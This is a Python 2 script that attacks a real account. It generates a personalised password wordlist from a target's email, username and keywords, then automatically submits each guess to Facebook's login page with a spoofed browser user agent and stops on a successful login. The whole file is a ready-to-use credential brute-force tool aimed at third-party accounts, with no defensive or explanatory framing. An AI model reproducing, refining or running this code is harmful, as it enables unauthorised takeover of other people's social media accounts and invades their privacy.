import socket
import os
import time
import cookielib
from time import strftime
from time import *
import time
import random
import argparse
try:
	import mechanize
except ImportError:
	print "{-} Please install the mechanize module. pip2 install mechanize"
tested = []
generated = []
matches = []
def args():
    global args
    parser = argparse.ArgumentParser()
    parser.add_argument('-e', '--user', help="email")
    parser.add_argument('-u', '--uname', help="On facebook, people use their email as username. However, for an attack like this it's not good to use the email in the wordlist. Enter their username on other social medias, Example: richard_06") 
    parser.add_argument('-k1', '--keyword1', help="Make a wordlist from keywords")
    parser.add_argument('-k2', '--keyword2', help="2nd Keyword to use when generating combinations")
    parser.add_argument('-k3', '--keyword3', help="3rd Keyword to use when generating combinations")
    args = parser.parse_args()
    if args.uname == None:
        print "Username to use in combinations not specified"
        quit()
    if args.user == None:
        print "Email not specified"
        quit()
    if args.keyword1 == None:
        print "Keyword1 not specified."
        quit()
    if args.keyword2 == None:
        print "Keyword2 not specified."
        quit()
    if args.keyword3 == None:
        generic =  ["football", "love", "soccer", "password"]
        veryrandom = random.choice(generic)
        print "Keyword3 -->", veryrandom
        args.keyword3 = veryrandom
def fbrt():
        global args
	br = mechanize.Browser()
        years = ["2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", "2009", "2010", "2011", "2012",
             "2013", "2014", "2015", "2016", "2017", "2018", "2019", "2020"]
        specialchars = ["#", ".", "_", "-", "$", "/"]
        nums = ['05', '04', '03', '02', '01', '123', '321', '999', '909', '987', '567', '543', '0123', '9870', '999000', '55555', '99999']
        keyword = str(args.keyword1)
        keyword2 = str(args.keyword2)
        keyword3 = str(args.keyword3)
        ssid = str(args.uname)
        print "Generating combinations.."
        for yrs in years:
            for num in nums:
                for specialchar in specialchars:
                    generated.append(keyword + "\n")
                    generated.append(keyword + num + "\n")
                    generated.append(keyword2 + "\n")
                    generated.append(keyword2 + yrs + "\n")
                    generated.append(keyword2 + num +"\n")
                    generated.append(keyword2 + specialchar + "\n")
                    generated.append(keyword3 + "\n")
                    generated.append(keyword3 + yrs + "\n")
                    generated.append(keyword3 + num +"\n")
                    generated.append(keyword3 + specialchar + "\n")
                    generated.append(str(keyword) + yrs + "\n") 
                    generated.append(str(keyword) + "\n")
                    generated.append(str(args.uname) + str(keyword) + "\n")
                    generated.append(str(args.uname) + "\n")
                    generated.append(str(args.uname) + yrs + "\n")
                    generated.append(ssid + "_" + yrs + "\n")
                    generated.append(ssid + "." + yrs + "\n")
                    generated.append(ssid + yrs + '\n')
                    generated.append(ssid + num + '\n')
                    generated.append(ssid + specialchar + '\n')
                    generated.append(ssid + '_' + yrs + '\n')
                    generated.append(num + ssid + '\n')
                    generated.append(keyword + num + '\n')
                    generated.append(keyword + yrs + '\n') 
                    generated.append(keyword + specialchar + '\n')
                    generated.append(num + keyword + '\n')
                    generated.append(yrs + keyword + '\n')
                    generated.append(keyword + ssid + '\n')
                    generated.append(ssid + keyword + '\n')
                    generated.append(keyword + '_' + num + '\n')
                    generated.append(keyword + '.' + num + '\n')
                    generated.append(keyword + specialchar + num + '\n')	
	useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	email = str(args.user)
	br.addheaders = [('User-agent', random.choice(useragents))]
	cj = cookielib.LWPCookieJar()
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_redirect(True)
	br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	br.set_cookiejar(cj)
	url = "https://www.facebook.com/login.php?login_attempt=1"
	br.open(url)
	print "[*] Attack Started at: " + strftime ("%a, %d %b %Y %H:%M:%S", gmtime())
	time.sleep(0.5)
	for password in generated:
	    br.select_form(nr=0)
	    br.form['email'] = email
	    br.form['pass'] = password.strip()
            r = br.submit()
	    if (r != url) and (not 'login_attempt' in r.geturl()):
		print "\nMatch found:",password
		matches.append(password)
		break
                quit()
	    if ('login_attempt' in r.geturl()):
	    	tested.append(password)
	    	print "Tested",len(tested),"of",len(generated)
def check_matches():
    if len(matches) < 1:
            print "No Matches Found"
            quit()
args()
fbrt()
check_matches()
